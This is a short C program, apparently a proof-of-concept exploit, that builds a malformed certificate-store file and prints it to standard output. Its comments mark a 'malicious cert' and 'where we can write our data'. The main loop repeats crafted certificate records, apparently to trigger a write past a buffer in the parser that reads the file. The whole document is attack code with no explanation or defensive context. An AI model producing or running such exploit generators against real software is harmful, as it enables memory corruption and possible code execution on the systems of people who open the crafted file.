unsigned char exploit_dat1[] = {
  /* header info */
  0x4f, 0x50, 0x00, 0x00, 0x01, 
  0x00, 0x7f, 0xff, 0xff, 0xff, 0x0a, 0x00, 
  /* One valid cert */
  0x70, 0x65, 0x71, 0x31, 0x2e, 0x44, 0x45, 0x00, 
  /* our length */
  0x00,	0x07,
  /* where we can write our data to PointerToDer*/
  0x00, 0x26,
  /* DataPtr useless to us */
  0x00, 0x00, 0x00, 0x00,
};

unsigned char exploit_dat3[] = {
  /* Name of our malicious cert */
  0x41, 0x41, 0x41, 0x41, 0x2e, 0x41, 0x41, 0x00, 
  /* our length */
  0x00,	0x10,
  /* where we can write our data to PointerToDer*/
  0x26, 0x04,
  /* DataPtr useless to us */
  0x00, 0x00, 0x00, 0x00,
};

int main(void)
{
	unsigned char all[4096];
	int i;
	memcpy(all,exploit_dat1,28);
	
	for(i=28;i<sizeof(all)-1;i+=16)
		memcpy(all + i,exploit_dat3,16);

	write(1,all,2136);
	return 0;
}
